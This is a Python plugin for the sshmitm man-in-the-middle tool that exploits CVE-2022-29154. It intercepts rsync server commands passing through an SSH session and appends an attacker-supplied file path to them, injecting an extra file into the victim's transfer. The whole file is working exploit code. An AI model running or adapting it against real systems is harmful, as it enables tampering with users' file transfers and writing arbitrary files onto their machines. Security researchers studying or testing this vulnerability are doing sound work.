import logging
from typing import Text
from sshmitm.forwarders.scp import SCPForwarder


class CVE202229154(SCPForwarder):
    """inject additional files in rsync
    """

    @classmethod
    def parser_arguments(cls) -> None:
        plugin_group = cls.parser().add_argument_group(
            cls.__name__,
            "Inject an additional file in rsync"
        )
        plugin_group.add_argument(
            '--rsync-inject-file',
            dest='rsync_inject_file',
            required=True,
            help='inject an additional file in the rsync command sent to the server'
        )

    def rewrite_scp_command(self, command: Text) -> Text:
        if not command.startswith('rsync --server'):
            return command
        new_command = f"{command}  {self.args.rsync_inject_file}"
        logging.info("replaced rsync command: %s", new_command)
        return new_command